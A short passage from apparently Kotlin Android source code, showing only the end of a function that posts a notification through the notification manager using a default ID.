        notificationManager.notify(DEFAULT_NOTIFY_ID, notification)
    }
}
